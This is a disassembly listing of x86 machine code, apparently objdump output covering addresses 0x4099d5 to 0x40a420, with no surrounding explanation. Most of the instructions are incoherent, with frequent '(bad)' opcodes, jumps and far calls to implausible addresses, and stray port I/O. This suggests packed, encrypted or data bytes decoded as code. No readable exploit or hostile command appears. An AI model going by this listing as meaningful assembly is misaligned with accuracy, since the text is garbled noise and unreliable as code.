  4099d5:	add    DWORD PTR ss:[eax],eax
  4099d8:	xchg   edi,eax
  4099d9:	fdivp  st(6),st
  4099db:	jne    0x40997c
  4099dd:	mov    dh,0xef
  4099df:	std    
  4099e0:	pusha  
  4099e1:	sub    BYTE PTR [eax-0x15],0x34
  4099e5:	push   ds
  4099e6:	jmp    DWORD PTR [edi-0x3c]
  4099e9:	sub    al,0x40
  4099eb:	add    bh,bh
  4099ed:	pop    esp
  4099ee:	add    BYTE PTR [eax],al
  4099f0:	out    0x7f,eax
  4099f2:	jne    0x4099fc
  4099f4:	outs   dx,DWORD PTR ds:[esi]
  4099f5:	lahf   
  4099f6:	std    
  4099f7:	call   DWORD PTR [eax+0x1653ef2f]
  4099fd:	push   edi
  4099fe:	push   0xff1e749f
  409a03:	addr16 and eax,0x3e80005e
  409a09:	jmp    0xc356a204
  409a0e:	outs   dx,BYTE PTR ds:[esi]
  409a0f:	call   FWORD PTR [ecx]
  409a11:	ins    BYTE PTR es:[edi],dx
  409a12:	outs   dx,DWORD PTR ds:[esi]
  409a13:	push   ebx
  409a14:	jg     0x409a1a
  409a16:	fistp  DWORD PTR [esi+0x6804436d]
  409a1c:	cmp    al,0x4
  409a1e:	add    eax,DWORD PTR [eax-0x1804d107]
  409a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a25:	scas   al,BYTE PTR es:[edi]
  409a26:	ins    DWORD PTR es:[edi],dx
  409a27:	call   DWORD PTR [esi+0x4b]
  409a2a:	rol    DWORD PTR [eax+0x0],1
	...
  409a55:	add    BYTE PTR [esi],bh
  409a57:	sbb    al,0x46
  409a59:	push   ebx
  409a5a:	jg     0x409a60
  409a5c:	fild   DWORD PTR [ecx]
  409a5e:	ds add al,0x83
  409a61:	call   DWORD PTR [ebx-0x4]
  409a64:	pop    edx
  409a65:	xchg   ebx,eax
  409a66:	ret    
  409a67:	inc    eax
  409a68:	ins    DWORD PTR es:[edi],dx
  409a69:	push   0xffc1d4a5
  409a6e:	sbb    DWORD PTR [edi],esi
  409a70:	rol    DWORD PTR [eax+0x3e],1
  409a73:	fadd   QWORD PTR [eax]
  409a75:	add    BYTE PTR [esi],bh
  409a77:	test   BYTE PTR [ebp+0x75],ch
  409a7a:	inc    esi
  409a7b:	ins    BYTE PTR es:[edi],dx
  409a7c:	lock cld 
  409a7e:	xchg   ecx,eax
  409a7f:	adc    bl,bl
  409a81:	out    dx,eax
  409a82:	in     eax,dx
  409a83:	ret    0x6802
  409a86:	jnp    0x409a7c
  409a88:	sar    edi,0xe1
  409a8b:	add    eax,0x30be0003
  409a90:	test   BYTE PTR [edi],0x56
  409a93:	sahf   
  409a94:	outs   dx,DWORD PTR ds:[esi]
  409a95:	jmp    DWORD PTR [ecx-0x65]
  409a98:	outs   dx,DWORD PTR ds:[esi]
  409a99:	push   ebx
  409a9a:	inc    DWORD PTR [ebx]
  409a9c:	fcmovnb st,st(4)
  409a9e:	in     eax,dx
  409a9f:	inc    edx
  409aa0:	add    al,0x68
  409aa2:	cmp    al,0x4
  409aa4:	add    eax,DWORD PTR [eax-0x1803b9bf]
  409aaa:	mov    BYTE PTR [ebx-0x5c],bl
  409aad:	ins    BYTE PTR es:[edi],dx
  409aae:	xor    DWORD PTR [esi+0x63b36d03],eax
  409ab4:	cmp    edx,0xd98e1123
	...
  409ae2:	add    BYTE PTR [eax],al
  409ae4:	pop    esp
  409ae5:	adc    ah,bh
  409ae7:	sti    
  409ae8:	sbb    DWORD PTR [ecx],edx
  409aea:	jl     0x409b58
  409aec:	or     DWORD PTR [esi+0x638b6cd5],eax
  409af2:	xor    DWORD PTR [esi-0x5],0x6b6c6610
  409af9:	divps  xmm6,xmm6
  409afc:	inc    ecx
  409afd:	add    edx,DWORD PTR [ebx]
  409aff:	inc    esp
  409b00:	loope  0x409b12
  409b02:	and    BYTE PTR [ecx+0x42],al
  409b05:	pop    ebx
  409b06:	pushf  
  409b07:	js     0x409aeb
  409b09:	fdivr  QWORD PTR [ebx-0x35733601]
  409b0f:	(bad)  [ebx-0x59]
  409b12:	test   al,0x3
  409b14:	mov    ecx,0xff5bf586
  409b19:	sbb    BYTE PTR [esi],bl
  409b1b:	ins    BYTE PTR es:[edi],dx
  409b1c:	push   cs
  409b1d:	sub    ecx,0x3
  409b20:	xchg   ecx,eax
  409b21:	sar    DWORD PTR [eax+0x1163136c],1
  409b27:	mov    ds:0x5afe10a6,eax
  409b2c:	mov    eax,0x166bf61d
  409b31:	mov    al,0x95
  409b33:	ret    0x1179
  409b36:	pop    esp
  409b37:	clc    
  409b38:	pop    ecx
  409b39:	cmp    esp,DWORD PTR [edi+0x41ab696b]
  409b3f:	add    eax,0xd48f003e
  409b44:	pop    eax
  409b45:	xchg   cl,dh
  409b47:	pop    ebx
	...
  409b70:	add    BYTE PTR [eax],al
  409b72:	rol    DWORD PTR [edx],1
  409b74:	mov    esi,0x7e566b
  409b79:	stos   DWORD PTR es:[edi],eax
  409b7a:	aad    0xf
  409b7c:	push   0x9b0e3b
  409b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b82:	das    
  409b83:	fs call 0xff511b27
  409b89:	cmp    DWORD PTR [edx],eax
  409b8b:	pop    edx
  409b8c:	add    BYTE PTR [esi-0x1c],bh
  409b8f:	stos   BYTE PTR es:[edi],al
  409b90:	(bad)  
  409b91:	cld    
  409b92:	adc    eax,0x95915df8
  409b97:	adc    al,ch
  409b99:	and    eax,0xa0ff1078
  409b9e:	and    BYTE PTR [ebx+0x0],0xbc
  409ba2:	jo     0x409ba3
  409ba4:	(bad)  
  409ba5:	aam    0xf1
  409ba7:	not    DWORD PTR [edi+ebp*1+0x290b1055]
  409bae:	into   
  409baf:	jno    0x409c19
  409bb1:	stos   BYTE PTR es:[edi],al
  409bb2:	add    DWORD PTR [ebx+0x3a659900],ebx
  409bb8:	(bad)  
  409bb9:	ss push ebp
  409bbb:	stos   DWORD PTR es:[edi],eax
  409bbc:	push   eax
  409bbd:	cs scas eax,DWORD PTR es:[edi]
  409bbf:	push   edi
  409bc0:	call   0xff50c05a
  409bc5:	adc    DWORD PTR ds:0x6316ff1d,esi
  409bcb:	sbb    eax,0xe46ee908
  409bd0:	jmp    0x409c3c
  409bd2:	(bad)  
  409bd3:	cli    
  409bd4:	imul   ebp,ecx,0x0
	...
  409bfe:	add    BYTE PTR [eax],al
  409c00:	adc    al,0x86
  409c02:	adc    dh,dh
  409c04:	mov    fs,WORD PTR [ebx-0x1]
  409c07:	mov    ah,0x0
  409c09:	mov    ds:0x7515e941,eax
  409c0e:	(bad)
  409c11:	loope  0x409c57
  409c13:	fld    QWORD PTR [ebx+0x2e54fe0f]
  409c19:	adc    BYTE PTR [ebp+0x0],dh
  409c1c:	dec    ebx
  409c1d:	test   BYTE PTR ds:0xff160fc3,dh
  409c23:	out    0x53,eax
  409c25:	call   0x6afb:0x1b9effff
  409c2c:	daa    
  409c2d:	xor    BYTE PTR [ebp+0x18],0xc8
  409c31:	or     ecx,DWORD PTR [ebx]
  409c33:	inc    DWORD PTR [edx]
  409c35:	xchg   esi,eax
  409c36:	dec    eax
  409c37:	inc    ecx
  409c38:	daa    
  409c39:	mov    bl,0xee
  409c3b:	les    edi,FWORD PTR [eax-0x40ba767f]
  409c41:	xchg   ebx,eax
  409c42:	inc    ebp
  409c43:	call   0x1cb61e6f
  409c48:	push   0x52ff0b0b
  409c4d:	xchg   esi,eax
  409c4e:	dec    eax
  409c4f:	inc    ecx
  409c50:	xlat   BYTE PTR ds:[ebx]
  409c51:	mov    dl,0xd6
  409c53:	les    ecx,FWORD PTR [eax+0x77458981]
  409c59:	xor    bh,bh
  409c5b:	(bad)  
  409c5c:	xchg   edx,eax
  409c5d:	cmp    bh,bh
  409c5f:	jne    0x409c3c
  409c61:	xor    DWORD PTR ds:0xc3,0x0
	...
  409c8b:	add    BYTE PTR [eax],al
  409c8d:	add    BYTE PTR [edi+0x67e7ff17],bl
  409c93:	dec    esi
  409c94:	(bad)  
  409c95:	jmp    FWORD PTR [esi]
  409c97:	sbb    ebp,ebx
  409c99:	(bad)  
  409c9a:	loop   0x409d16
  409c9c:	push   eax
  409c9d:	inc    edx
  409c9f:	outs   dx,BYTE PTR ds:[esi]
  409ca0:	push   DWORD PTR [ebp+0x7b]
  409ca3:	xor    DWORD PTR ds:0xff17cfc3,0xff4defe7
  409cad:	call   FWORD PTR [esi]
  409caf:	sbb    esp,ebx
  409cb1:	sub    edx,0x75
  409cb4:	add    BYTE PTR [edi],cl
  409cb6:	jecxz  0x409ca2
  409cb8:	(bad)  
  409cb9:	call   DWORD PTR [edi-0x29]
  409cbc:	jl     0x409cb6
  409cbe:	ds add al,0xf8
  409cc1:	add    esp,0x4
  409cc4:	add    eax,DWORD PTR [eax]
  409cc6:	mov    ebp,0x39007097
  409ccb:	js     0x409c51
  409ccd:	add    BYTE PTR [esi],bh
  409ccf:	add    al,0x68
  409cd1:	jne    0x409d39
  409cd3:	mov    ebp,0xf2607ee
  409cd8:	test   eax,0xeeed29ff
  409cdd:	sti    
  409cde:	and    DWORD PTR [edi-0x4],ebp
  409ce1:	out    0xaa,eax
  409ce3:	sahf   
  409ce4:	imul   edi,edi,0xff6b0f11
  409cea:	xchg   ebx,eax
  409ceb:	or     al,0x5b
  409ced:	popa   
  409cee:	rol    BYTE PTR [ecx+ebp*2+0xff],0x0
	...
  409d1a:	add    BYTE PTR [eax],al
  409d1c:	jae    0x409ca6
  409d1e:	imul   esi,DWORD PTR [ebp+0x46],0xe9bdd2ac
  409d25:	lods   al,BYTE PTR ds:[esi]
  409d26:	cmp    DWORD PTR [ebp+0x16],0x11
  409d2a:	add    ebp,edi
  409d2c:	cwde   
  409d2d:	es idiv dh
  409d30:	dec    ebx
  409d31:	push   esp
  409d32:	imul   esi,DWORD PTR [ebp+0x36],0xc1bdc6ac
  409d39:	inc    esp
  409d3a:	pop    ebp
  409d3b:	push   cs
  409d3c:	mov    ecx,0x2bff5ac6
  409d41:	je     0x409dac
  409d43:	jne    0x409d7b
  409d45:	ins    BYTE PTR es:[edi],dx
  409d46:	add    bh,BYTE PTR [esi+0x756964a1]
  409d4c:	stos   BYTE PTR es:[edi],al
  409d4d:	pop    esp
  409d4e:	out    dx,eax
  409d4f:	pop    es
  409d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d51:	sbb    al,0xa9
  409d53:	dec    DWORD PTR [ecx+0x3ee3e780]
  409d59:	nop
  409d5a:	push   cs
  409d5b:	cmp    ebx,0x63
  409d5e:	add    BYTE PTR [ebp+0x41],dh
  409d61:	pop    ebx
  409d62:	jb     0x409d22
  409d64:	pop    ebp
  409d65:	or     eax,0x62eb6919
  409d6a:	rcl    DWORD PTR [edi+0x5cce0d9b],0x44
  409d71:	sub    ecx,0xd162d368
  409d77:	mov    ds:0x68b60d83,eax
  409d7c:	mov    bl,0x7
  409d7e:	shl    DWORD PTR [eax+0x0],0x0
	...
  409daa:	dec    BYTE PTR [esi+eiz*4]
  409dad:	push   0x48910fb3
  409db2:	dec    BYTE PTR [esi+edx*4]
  409db5:	push   0x50811393
  409dba:	dec    BYTE PTR [esi+eax*4]
  409dbd:	push   0x38910b93
  409dc2:	dec    BYTE PTR [esi+esi*2]
  409dc5:	push   0x4080ff73
  409dca:	dec    BYTE PTR [esi+eiz*2]
  409dcd:	push   0xa850f773
  409dd2:	dec    BYTE PTR [esi+edx*2]
  409dd5:	cmp    bh,ah
  409dd7:	aaa    
  409dd8:	jmp    0x684062ab
  409ddd:	aas    
  409dde:	into   
  409ddf:	add    al,0x3e
  409de1:	push   0x58e96856
  409de6:	clc    
  409de7:	adc    DWORD PTR [eax],0xffffffcf
  409dea:	(bad)  
  409deb:	pop    edx
  409dec:	xchg   ecx,eax
  409ded:	cmp    DWORD PTR [edx],edx
  409def:	call   0x3a8:0xa776dbe9
  409df6:	es int3 
  409df8:	mov    ah,0xc2
  409dfa:	xchg   ecx,eax
  409dfb:	je     0x409e40
  409dfd:	iret   
  409dfe:	(bad)  
  409dff:	pop    edx
  409e00:	xchg   ecx,eax
  409e01:	aas    
  409e02:	jmp    0xc85:0xe6e90099
  409e09:	out    dx,al
  409e0a:	arpl   WORD PTR [eax+ebp*8+0x50],dx
	...
  409e36:	add    BYTE PTR [eax],al
  409e38:	loopne 0x409e45
  409e3a:	call   DWORD PTR [ecx+0x4d]
  409e3d:	pop    ebx
  409e3e:	out    dx,eax
  409e3f:	xchg   edi,eax
  409e40:	jp     0x409eb4
  409e42:	push   ebp
  409e43:	sub    BYTE PTR [edx],bh
  409e45:	adc    DWORD PTR ds:0x670c831c,0xfffffff0
  409e4c:	outs   dx,BYTE PTR ds:[esi]
  409e4d:	fwait
  409e4e:	add    BYTE PTR [ecx-0x4d],al
  409e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e52:	inc    ecx
  409e53:	jmp    0x2894956d
  409e58:	inc    edx
  409e59:	cmp    ebp,0x35
  409e5c:	sti    
  409e5d:	or     edi,esi
  409e5f:	sbb    al,0x16
  409e61:	or     eax,0x5075e175
  409e66:	inc    BYTE PTR [esi-0x16eb7c5f]
  409e6c:	push   0xef367cd
  409e71:	fwait
  409e72:	add    BYTE PTR [ecx],al
  409e74:	adc    esp,DWORD PTR [edi-0x5bfa16bf]
  409e7a:	push   ebp
  409e7b:	test   al,0x3d
  409e7d:	xor    DWORD PTR [esi],0xffffffbc
  409e80:	add    cl,BYTE PTR [edi+eiz*2]
  409e83:	add    al,0xef
  409e85:	call   0xe941:0xa688d100
  409e8c:	pop    eax
  409e8d:	xchg   BYTE PTR [esi+esi*1],cl
  409e90:	scas   eax,DWORD PTR es:[edi]
  409e91:	push   ebx
  409e92:	call   0xff4cba73
  409e97:	je     0x409f18
  409e99:	(bad)  
  409e9b:	push   ds
	...
  409ec4:	add    BYTE PTR [eax],al
  409ec6:	scas   eax,DWORD PTR es:[edi]
  409ec7:	pop    edi
  409ec8:	(bad)  
  409ec9:	fdiv   st(4),st
  409ecb:	mov    ds:0xa2f5e941,al
  409ed0:	lods   al,BYTE PTR ds:[esi]
  409ed1:	add    BYTE PTR [edi+0xac00b57],dl
  409ed7:	add    al,dh
  409ed9:	inc    ebp
  409eda:	outs   dx,DWORD PTR ds:[esi]
  409edb:	push   edi
  409edc:	add    BYTE PTR [eax],al
  409ede:	addr16 dec esp
  409ee0:	inc    ebp
  409ee1:	hlt    
  409ee2:	pusha  
  409ee3:	or     al,0xff
  409ee5:	dec    DWORD PTR ds:0xfd006a57
  409eeb:	push   esi
  409eec:	push   0x0
  409eee:	repnz sbb dh,bl
  409ef1:	push   eax
  409ef2:	rcr    dl,cl
  409ef4:	repz test DWORD PTR [eax+0x7aff5074],0xe375ff77
  409eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f00:	push   ds
  409f01:	lods   al,BYTE PTR ds:[esi]
  409f02:	pop    ss
  409f03:	pop    edi
  409f04:	or     eax,eax
  409f06:	dec    ebx
  409f07:	pop    ebp
  409f08:	jmp    0x409f4a
  409f0a:	aas    
  409f0b:	loop   0x409f54
  409f0d:	inc    ecx
  409f0e:	daa    
  409f0f:	xor    BYTE PTR [ebp+0xc],0xaf
  409f13:	or     al,0xc2
  409f15:	inc    DWORD PTR [eax+0x6a8dd085]
  409f1b:	jp     0x409f14
  409f1d:	jmp    DWORD PTR [eax+0x2e]
  409f20:	push   ecx
  409f21:	call   0x403cee
  409f26:	outs   dx,BYTE PTR ds:[esi]
  409f27:	fucomi st,st(7)
  409f29:	test   DWORD PTR [eax],0x0
	...
  409f53:	add    BYTE PTR [eax-0x7f],dh
  409f56:	push   DWORD PTR [ebp-0x8689]
  409f5c:	or     BYTE PTR [ebx],0x7
  409f5f:	call   0x401f6e
  409f64:	jo     0x409f31
  409f66:	out    dx,eax
  409f67:	mul    DWORD PTR [eax-0x7f]
  409f6a:	call   0xffc1c014
  409f6f:	(bad)  
  409f70:	fidiv  DWORD PTR [esi-0x15]
  409f73:	xchg   ebp,eax
  409f74:	ds jno 0x409f67
  409f77:	sti    
  409f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f79:	inc    eax
  409f7a:	call   0x3e08:0x414b3e00
  409f81:	out    dx,eax
  409f82:	jns    0x409f70
  409f84:	mov    ebp,0x3e6a6738
  409f89:	fdivp  st(4),st
  409f8b:	(bad)  
  409f8c:	repz or ebx,DWORD PTR [ebx-0x46]
  409f90:	mov    ds:0x3896529,al
  409f95:	xor    ah,bl
  409f97:	sub    dl,0x32
  409f9a:	add    al,0xff
  409f9c:	ror    DWORD PTR [ebx],cl
  409f9e:	pop    ebx
  409f9f:	mov    bh,0x40
  409fa1:	leave  
  409fa2:	fs push 0x3e
  409fa5:	pushf  
  409fa6:	xchg   esi,eax
  409fa7:	push   esp
  409fa8:	jg     0x409f9e
  409faa:	fiadd  DWORD PTR [eax-0xfbcc6e]
  409fb0:	imul   esi,DWORD PTR [ebp-0x23c1bf45],0xfffffff0
  409fb7:	rol    DWORD PTR [eax],0x0
	...
  409fe2:	adc    ecx,ebx
  409fe4:	clc    
  409fe5:	mov    edi,0x4fd31192
  409fea:	add    DWORD PTR [edi],ecx
  409fec:	sti    
  409fed:	out    0xd3,eax
  409fef:	(bad)  
  409ff0:	gs jmp esi
  409ff3:	cmp    esp,DWORD PTR [ebp+0x32de9ff]
  409ff9:	push   0xffc1cb9f
  409ffe:	popa   
  409fff:	mov    al,dl
  40a001:	inc    eax
  40a002:	ds cdq 
  40a004:	das    
  40a005:	ret    
  40a006:	jbe    0x409fbb
  40a008:	add    ch,al
  40a00a:	ja     0x40a042
  40a00c:	inc    DWORD PTR gs:[ebp+0x34]
  40a010:	lock push cs
  40a012:	push   cs
  40a013:	in     al,0x63
  40a015:	jne    0x40a04d
  40a017:	pop    ebx
  40a018:	adc    ecx,ebx
  40a01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a01b:	or     DWORD PTR [esi],ebx
  40a01d:	pop    esp
  40a01e:	cmp    dl,cl
  40a020:	adc    eax,0x815b2465
  40a025:	xchg   ebp,eax
  40a026:	repnz fwait
  40a028:	jmp    0xa8ef5f08
  40a02d:	add    esp,esi
  40a02f:	pop    esp
  40a030:	jmp    0xc9335e38
  40a035:	inc    ecx
  40a036:	imul   ecx,DWORD PTR [ecx],0x59ea43f2
  40a03c:	cmp    esp,edx
  40a03e:	pop    eax
  40a03f:	(bad)  
  40a040:	loope  0x40a09d
  40a042:	cld    
  40a043:	push   es
  40a044:	into   
  40a045:	add    BYTE PTR fs:[eax],al
	...
  40a070:	push   esi
  40a071:	ja     0xe9b4e1db
  40a077:	fcmovnu st,st(6)
  40a079:	xchg   ebx,eax
  40a07a:	sub    BYTE PTR [esi+eiz*4],al
  40a07d:	out    dx,eax
  40a07e:	adc    al,0xc3
  40a080:	sub    DWORD PTR [ecx-0x24c1fc15],eax
  40a086:	nop
  40a087:	ins    BYTE PTR es:[edi],dx
  40a088:	dec    DWORD PTR [eax]
  40a08a:	xchg   esi,eax
  40a08b:	clc    
  40a08c:	ror    DWORD PTR [edi+0x879d3de],1
  40a092:	cld    
  40a093:	sti    
  40a094:	sbb    DWORD PTR [ebx+0x7d],esp
  40a097:	fs stc 
  40a099:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a09b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a09c:	icebp  
  40a09d:	or     BYTE PTR [ebx],al
  40a09f:	or     ch,cl
  40a0a1:	mov    ?,ecx
  40a0a3:	pop    ebx
  40a0a4:	fs pop es
  40a0a6:	pop    esi
  40a0a7:	fs fs cmp al,0x56
  40a0ab:	out    dx,al
  40a0ac:	cmp    ebx,esi
  40a0ae:	fsub   DWORD PTR [edi-0x37]
  40a0b1:	or     bl,dl
  40a0b3:	pop    es
  40a0b4:	ror    DWORD PTR [esi+0x7205bf1],0x0
  40a0bb:	sbb    cl,BYTE PTR ss:[eax]
  40a0be:	jne    0x40a0ed
  40a0c0:	and    cl,BYTE PTR [esi-0x38a3eef8]
  40a0c6:	(bad)  
  40a0c7:	push   ds
  40a0c8:	push   esp
  40a0c9:	sbb    eax,0xd580e904
  40a0ce:	jmp    0x40a13a
  40a0d0:	dec    ecx
  40a0d1:	pop    es
  40a0d2:	push   esi
  40a0d3:	sahf   
	...
  40a0fc:	add    BYTE PTR [eax],al
  40a0fe:	or     BYTE PTR [bx+di-0x1a],ch
  40a102:	loop   0x40a091
  40a104:	or     BYTE PTR [ecx],al
  40a106:	inc    bl
  40a108:	(bad)  
  40a109:	out    dx,al
  40a10a:	out    0x9d,eax
  40a10c:	cld    
  40a10d:	jb     0x40a156
  40a10f:	mov    al,ds:0xd4422848
  40a114:	cmp    al,0x22
  40a116:	sbb    BYTE PTR [ebx+0x5b1d6900],0x74
  40a11d:	cmp    dl,BYTE PTR [edx-0x2b]
  40a120:	push   esp
  40a121:	sub    BYTE PTR [edx-0x50],al
  40a124:	call   0x9b81f2
  40a129:	loop   0x40a1a8
  40a12b:	(bad)  
  40a12c:	pop    ds
  40a12d:	aas    
  40a12e:	xchg   edx,eax
  40a12f:	dec    edi
  40a130:	enter  0x9d9e,0xab
  40a134:	push   0xbdf83de9
  40a139:	add    ebp,edx
  40a13b:	lods   eax,DWORD PTR ds:[esi]
  40a13c:	inc    ecx
  40a13d:	jmp    0xf1b5aa0f
  40a142:	gs fwait
  40a144:	out    0x76,eax
  40a146:	pop    ebp
  40a147:	repz dec eax
  40a149:	das    
  40a14a:	pop    ebp
  40a14b:	or     BYTE PTR [eax-0x80],ch
  40a14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a14f:	call   0xe9a9:0xcd65b600
  40a156:	cmp    eax,0x3cd5c054
  40a15b:	mov    cl,0xe8
  40a15d:	add    cl,dl
  40a15f:	xchg   ebx,eax
  40a160:	(bad)  
  40a161:	inc    DWORD PTR [eax]
	...
  40a18b:	add    bh,dl
  40a18d:	repz (bad) 
  40a18f:	(bad)  
  40a190:	clc    
  40a191:	mov    esp,0x1ed2a767
  40a196:	dec    DWORD PTR [edi+0x58]
  40a199:	and    al,BYTE PTR [edi]
  40a19b:	call   0x401635
  40a1a0:	aas    
  40a1a1:	or     BYTE PTR [ebp+0x17838ff],bh
  40a1a7:	inc    esi
  40a1a8:	pop    ss
  40a1a9:	cmp    eax,0x153d7500
  40a1ae:	sti    
  40a1af:	xor    esp,DWORD PTR [edi]
  40a1b1:	out    0xfe,al
  40a1b3:	call   FWORD PTR [eax+0x7c]
  40a1b6:	repnz scas al,BYTE PTR es:[edi]
  40a1b8:	pop    ds
  40a1b9:	push   esp
  40a1ba:	jne    0x40a149
  40a1bc:	js     0x40a1e0
  40a1be:	sti    
  40a1bf:	push   edx
  40a1c1:	push   esi
  40a1c2:	call   0xffbd4e3e
  40a1c7:	pop    edi
  40a1c8:	sbb    DWORD PTR [esi-0x3bd8fb3e],edx
  40a1ce:	mov    esp,ebp
  40a1d0:	jg     0x40a231
  40a1d2:	add    bh,ch
  40a1d4:	cdq    
  40a1d5:	repnz (bad) 
  40a1d7:	push   ebp
  40a1d8:	push   esi
  40a1d9:	pop    edi
  40a1da:	push   DWORD PTR [ebp+0x2b]
  40a1dd:	jp     0x40a254
  40a1df:	or     BYTE PTR [edi-0x47001955],bh
  40a1e5:	repnz (bad) 
  40a1e7:	jmp    FWORD PTR [eax+0x52ce67bc]
  40a1ed:	and    bh,bh
  40a1ef:	inc    BYTE PTR [eax]
	...
  40a219:	add    dl,dh
  40a21b:	push   esi
  40a21c:	push   DWORD PTR [ebp-0x21]
  40a21f:	jb     0x40a1d9
  40a221:	out    0x58,al
  40a223:	jns    0x40a1ee
  40a225:	ret    0x5acf
  40a228:	push   ebp
  40a229:	mov    edi,DWORD PTR [esi]
  40a22b:	mov    al,ds:0x9c3a7562
  40a230:	adc    al,dl
  40a232:	rcr    DWORD PTR [ebp-0x5cd3ff2],0xea
  40a239:	mov    dl,0xb
  40a23b:	mov    bl,0x2
  40a23d:	push   eax
  40a23e:	xchg   esi,eax
  40a23f:	test   eax,0xc4a1ff44
  40a244:	mov    dl,0xfe
  40a246:	adc    ecx,DWORD PTR [ebx+ebp*2]
  40a249:	stos   DWORD PTR es:[edi],eax
  40a24a:	xchg   ecx,eax
  40a24b:	ins    DWORD PTR es:[edi],dx
  40a24c:	(bad)  
  40a24d:	call   0xffa339f9
  40a252:	ja     0x40a286
  40a254:	or     eax,DWORD PTR [eax]
  40a256:	adc    ecx,DWORD PTR [ecx+0x107a836f]
  40a25c:	in     al,dx
  40a25d:	call   edi
  40a25f:	sti    
  40a260:	popa   
  40a261:	jne    0x40a299
  40a263:	sub    al,0x9d
  40a265:	mov    edx,0x458b2559
  40a26a:	push   edx
  40a26b:	call   0xffc3:0x4ea06804
  40a272:	fchs   
  40a274:	mov    dh,0x40
  40a276:	lds    edx,FWORD PTR ds:[esi]
  40a279:	ret    
  40a27a:	xchg   BYTE PTR [ebx],dh
  40a27c:	add    al,0xe8
	...
  40a2a6:	add    BYTE PTR [eax],al
  40a2a8:	mov    edi,0x35ff60b3
  40a2ad:	mov    ah,0xd7
  40a2af:	adc    ebp,DWORD PTR [esi+0x6c]
  40a2b2:	add    eax,DWORD PTR [eax]
  40a2b4:	and    DWORD PTR [esi-0x36c014c],ebp
  40a2ba:	push   0x63
  40a2bc:	sbb    eax,0x8fe860dd
  40a2c1:	inc    edi
  40a2c2:	popa   
  40a2c3:	jmp    DWORD PTR [esp+esi*8-0x16]
  40a2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2c8:	nop
  40a2c9:	xor    eax,DWORD PTR [eax+ebp*2]
  40a2cc:	out    0x5a,al
  40a2ce:	mov    esp,0x1404d9c2
  40a2d3:	inc    ebp
  40a2d4:	xchg   BYTE PTR [ecx+ebp*8+0x4e1b6c6b],bl
  40a2db:	popa   
  40a2dc:	xor    eax,0x9f7bd1b
  40a2e1:	jae    0x40a2cb
  40a2e3:	add    esp,DWORD PTR [ecx+0x336098c4]
  40a2e9:	push   ebx
  40a2ea:	inc    ecx
  40a2eb:	sbb    BYTE PTR [ebp+0x5c6c2605],bl
  40a2f1:	enter  0x611d,0x24
  40a2f5:	pop    ebx
  40a2f6:	sbb    DWORD PTR [ecx-0x14166410],0x3a8ad4f
  40a300:	jns    0x40a351
  40a302:	sub    cl,ah
  40a304:	(bad)  
  40a305:	pop    edx
  40a306:	add    DWORD PTR ds:0xcee057e,esp
	...
  40a334:	add    BYTE PTR [eax],al
  40a336:	jle    0x40a2c6
  40a338:	div    BYTE PTR [ebx+0xc540609]
  40a33e:	push   ax
  40a340:	(bad)  
  40a341:	pusha  
  40a342:	dec    ecx
  40a343:	repnz rcr BYTE PTR [edi+0x4530541],1
  40a34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a34b:	int    0x16
  40a34d:	ret    
  40a34e:	xor    DWORD PTR [ebp+0x13],edi
  40a351:	mov    edx,0x16ae5b7e
  40a356:	std    
  40a357:	xchg   ebx,eax
  40a358:	sub    BYTE PTR [esi+eiz*1],al
  40a35b:	add    ebx,DWORD PTR [esi+0x60]
  40a35e:	adc    DWORD PTR [ecx-0x57],edx
  40a361:	xlat   BYTE PTR ds:[ebx]
  40a362:	cmp    BYTE PTR [ebx+0x538b6139],ch
  40a368:	xchg   ecx,eax
  40a369:	arpl   ax,di
  40a36b:	add    al,0x7e
  40a36d:	imul   eax,DWORD PTR [eax],0xffffffc8
  40a370:	push   DWORD PTR [ebp+0x5e]
  40a373:	jno    0x40a375
  40a375:	add    DWORD PTR [edi-0x1a16be53],ebx
  40a37b:	in     eax,dx
  40a37c:	push   ebp
  40a37d:	test   al,0x3d
  40a37f:	add    al,0x35
  40a381:	sub    dh,ch
  40a383:	fwait
  40a384:	add    BYTE PTR [ecx+0x6e],al
  40a387:	(bad)  
  40a388:	inc    BYTE PTR [esi+0x4a]
  40a38b:	sbb    esi,DWORD PTR [esi+ebp*8-0x13]
  40a38f:	xchg   esp,eax
  40a390:	(bad)  
  40a391:	mov    esp,0x2fb5f335
  40a396:	push   ds
  40a397:	add    al,0xe8
  40a399:	dec    ebp
	...
  40a3c2:	add    BYTE PTR [eax],al
  40a3c4:	mov    ecx,0x9193ff04
  40a3c9:	add    eax,0x2315e175
  40a3ce:	dec    BYTE PTR [esi]
  40a3d0:	push   ds
  40a3d1:	jno    0x40a3ed
  40a3d3:	push   es
  40a3d4:	nop
  40a3d5:	pop    esp
  40a3d6:	call   0xff44830a
  40a3db:	and    DWORD PTR [edx],0x4
  40a3de:	jne    0x40a3c1
  40a3e0:	aad    0x1e
  40a3e2:	(bad)  
  40a3e3:	out    0xf9,al
  40a3e5:	add    esi,DWORD PTR [ebp-0x23]
  40a3e8:	icebp  
  40a3e9:	lea    ecx,[eax]
  40a3eb:	shr    ebx,0xc1
  40a3ee:	dec    dh
  40a3f0:	repz sbb BYTE PTR [ecx+ebp*8],al
  40a3f4:	not    al
  40a3f6:	jmp    0x40a3b6
  40a3f8:	pop    ss
  40a3f9:	push   eax
  40a3fa:	call   0xff4526ac
  40a3ff:	loop   0x40a47e
  40a401:	(bad)  
  40a402:	dec    esi
  40a403:	adc    DWORD PTR [edx-0x53],edx
  40a406:	inc    ecx
  40a407:	jmp    0xa9909fd9
  40a40c:	imul   eax,DWORD PTR [eax+edx*2],0x7bca39
  40a413:	add    bh,ah
  40a415:	je     0x40a3d5
  40a417:	push   0x3fccac
  40a41c:	inc    edi
  40a41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a41e:	jne    0x40a428
  40a420:	mov    edi,0x60ffe565
